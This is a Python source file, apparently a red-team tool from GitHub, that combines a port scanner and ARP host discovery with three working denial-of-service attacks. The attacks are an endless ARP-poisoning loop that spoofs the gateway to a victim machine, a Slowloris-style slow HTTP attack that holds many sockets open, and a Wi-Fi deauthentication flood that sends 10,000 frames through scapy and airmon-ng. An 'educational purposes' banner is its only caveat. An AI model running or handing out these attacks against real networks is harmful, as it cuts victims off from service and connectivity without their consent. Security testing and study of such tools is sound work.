import pyfiglet
import socket
import time
import os
import sys
import optparse
import scapy.all as scapy
import subprocess
global host
global No_of_sockets

def check_sudo():
    if os.getuid() != 0:
        print("[!] please use (SUDO) privileges to run the code ")
        sys.exit(1)

check_sudo()

ter_agrus = optparse.OptionParser()
ter_agrus.add_option("-T","--Type",dest="type_of_function",  help="{Choose between 5 types of functions:}\n"
                                                                
                                                                        """
                                                                        {-T PS or --Type PortScan}\n"""
                                                                
                                                                        """
                                                                        {-T NS or --Type NetScan}\n"""
                                                               
                                                                        """
                                                                        {-T H or --Type HTTP}\n"""
                                                                
                                                                        """
                                                                        {-T R or --Type ARP}\n"""
                                                                
                                                                        """
                                                                        {-T D or --Type Deauth}\n""")

ter_agrus.add_option("-A", "--Addr", dest="host", help="specifying ip address for to scan as the format -A 192.168.1.1 and add /24 for network scanning \n ")
ter_agrus.add_option("-s", "--SocketNumber", dest="No_of_sockets", help="Specify the number of sockets to establish \n\n  ")
ter_agrus.add_option("-i", "--interface", dest="Iface", help="Choose the interface \n\n  ")
ter_agrus.add_option("-1", "--P1", dest="port_L", help="choose lower port\n\n  ")
ter_agrus.add_option("-2", "--P2", dest="port_h", help="choose higher port \n\n  ")

(options, args) = ter_agrus.parse_args()

if not options.type_of_function:
    ter_agrus.error("[-] Please specify the type of function please or use --help  ")

No_of_sockets = options.No_of_sockets
type_of_function = options.type_of_function
host = options.host
Iface = options.Iface
port_L = options.port_L
port_h = options.port_h

time.sleep(1)

def copyright_banner():
    ascii_banner = pyfiglet.figlet_format("RedTeam Python")
    
    print(ascii_banner)
    time.sleep(1)
    print("[!] This code is only for educational purposes *dont use it without any permissions*\n\n")

def copyright_banner2():
    print("#------------------------------------------#")
    print(f"#          RedTeam Python v1.0            #")
    print("#            Created by Mohammad           #")
    print("#              GitHub Repository:          #")
    print("#https://github.com/AsoMoe/Red-Team-Python #")
    print("#------------------------------------------#")


copyright_banner()
copyright_banner2()

print("_" * 50)
print()

time.sleep(.5)

if type_of_function == "PortScan" or type_of_function == "PS":
    def Scan_Function():
        print("[+] Starting the Scan function\n ")
        print("_" * 50)
        time.sleep(1)
        global port_L
        global port_h

        Pl = int(port_L)
        ph = int(port_h)

        ip_host = socket.gethostbyname(host)
        time.sleep(2)
        print("[+]IP:{} | Ports: {} - {}".format(ip_host, port_L, port_h))
        print("-" * 50)
        succ_ports = []

        for port in range(Pl, ph + 1):
            socket_1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            print(".")
            try:
                socket_1.connect((ip_host, port))
                print("[+] port {} is open".format(port))
                succ_ports.append(port)
                socket_1.close()
            except socket.error as e:
                print("[!] port {} is Not available ".format(port))
            except KeyboardInterrupt:
                print("[+] exiting program ")
                sys.exit()

        print("_" * 50)
        print()

        if len(succ_ports) > 0:
            print("+-------------+--------------+")
            print("| Port        | Status       |")
            print("+-------------+--------------+")
            for any_port in succ_ports:
                print("| {:<11} | {:<12} |".format(any_port, "available"))
                print("+-------------+--------------+")
        else:
            print("<<------results------>>\n")
            time.sleep(0.75)
            print("[!] There are no open ports, please try again!!!")

    Scan_Function()

elif type_of_function == "NS" or type_of_function == "NetScan":
    def N_Scan():
        arp_obj = scapy.ARP(pdst=host)
        brodcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        comb_macip = brodcast_frame / arp_obj
        live_hosts = scapy.srp(comb_macip, timeout=1, verbose=False)[0]

        print("[+] Scanning the Network ...")

        time.sleep(2)
        print()
        print("_" * 50)
        print()

        if len(live_hosts) > 0:
            print("+-----------------+-----------------+")
            print("| IP              | MAC             |")
            print("+-----------------+-----------------+")

            for details in live_hosts:
                ip_address = details[1].psrc
                mac_address = details[1].hwsrc

                print("| {:<15} |{:<17}|".format(ip_address, mac_address))
                print("+-----------------+-----------------+")

    N_Scan()

elif type_of_function == "R" or type_of_function == "ARP":
    def N1_Scan():
        arp_obj = scapy.ARP(pdst=host)
        broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        comb_macip = broadcast_frame / arp_obj
        live_hosts = scapy.srp(comb_macip, timeout=1, verbose=False)[0]

        print("[+] Scanning MAC address for the victim machine ...")

        time.sleep(2)
        print()
        print("_" * 50)
        print()

        if len(live_hosts) > 0:
            print("+-----------------+-----------------+")
            print("| IP              | MAC             |")
            print("+-----------------+-----------------+")
            
            for details in live_hosts:
                ip_address = details[1].psrc
                mac_address = details[1].hwsrc

                print("| {:<15} |{:<17}|".format(ip_address, mac_address))
                print("+-----------------+-----------------+")
                
    
    time.sleep(1)
    N1_Scan()
    print("_" * 50)
    subprocess.run("route")
    print("_" * 50)
    GateWay=input("Enter the gateway:")
    print("_" * 50)
    MAC = input("Enter the mac address for the victim machine:")
    print("_" * 50)
    IP2 = input("Enter the IP address for the victim machine: ")
    print("_" * 50)
    
    time.sleep(2)
    print("[+] Starting DoS attack using ARP poisoning")

    def spoof(victim_ip, victim_mac):
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=GateWay)
        scapy.send(packet, verbose=False)

    packets_sent = 0
    while True:
        spoof(IP2, MAC)
        packets_sent += 1
        print("[+] Number of Packets sent: " + str(packets_sent))
        time.sleep(0.4)

elif type_of_function == "H" or type_of_function == "HTTP":
    print("[+]Slow Http attack initialized")
    print("[+]Creating Sockets......")
    time.sleep(3)

    def lories():
        try:
            port = 80
            IP = host
            print(IP)
            headers = [
                "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Accept-language: en-US,en,q=0.5",
                "Connection: Keep-Alive"
            ]

            open_sockets = []

            for c in range(int(No_of_sockets)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((IP, port))
                    open_sockets.append(s)
                except Exception as e:
                    print("failed to connect")

            while True:
                for Hreq in open_sockets:
                    try:
                        Hreq.send("GET / HTTP/1.1\r\n".encode("utf-8"))

                        for header in headers:
                            Hreq.send(bytes("{}\r\n".format(header).encode("utf-8")))
                        print("sent Http request to socket:{}".format(Hreq))
                    except:
                        print("reconnecting...")
                        open_sockets.remove(Hreq)
                        try:
                            new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_socket.settimeout(0.1)
                            new_socket.connect((IP, port))
                            open_sockets.append(new_socket)
                            print("[+] New socket created and connected.")

                        except:
                            print("[-] Failed to create a new socket:")

                print("Package sent")
                time.sleep(1)

        except ConnectionRefusedError:
            print("[-] Connection refused, retrying...")
            lories()

    lories()

elif type_of_function == "D" or type_of_function == "Deauth":
    def ChangeChannel():
        Channel = input("Please Enter the channel number")
        subprocess.run(["sudo", "iwconfig", Iface, "channel", Channel])

    def AirScan():
        subprocess.run(["sudo", "airodump-ng", Iface])
        print

    def Deauth():
        print("[+]Starting Deauth Attack ....")

        Mac1 = input("Enter mac address for the router:")

        Mac2 = input("Enter mac address for the targeted machine:")

        brdmac = "ff:ff:ff:ff:ff:ff"
        pkt = scapy.RadioTap() / scapy.Dot11(addr1=brdmac, addr2=Mac1, addr3=Mac2) / scapy.Dot11Deauth()
        scapy.sendp(pkt, iface="wlan0", count=10000, inter=.1)

    def SetMonitorMode():
        global Iface
        print("[+]Killing conflicting processes\n")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        print("[+]Setting interface into monitor mode\n")
        subprocess.run(["sudo", "airmon-ng", "start", Iface])
        subprocess.run(["sudo", "service", "NetworkManager", "start"])
        print(f"[+]{Iface} is set into monitor mode  ")
        subprocess.run("iwconfig")

    def SetManaged():
        choice = input("[!]Back to Managed mode ?(y/n)")

        if choice == "y":
            subprocess.run(["airmon-ng", "stop", Iface])
            time.sleep(3)
            subprocess.run("clear")
        else:
            subprocess.run("[!]You can back to Managed mode at any time using sudo airmon-ng stop wlan0")

    SetMonitorMode()
    AirScan()
    ChangeChannel()
    Deauth()
    SetManaged()
else:
    print("Invalid function type. Please try again.")
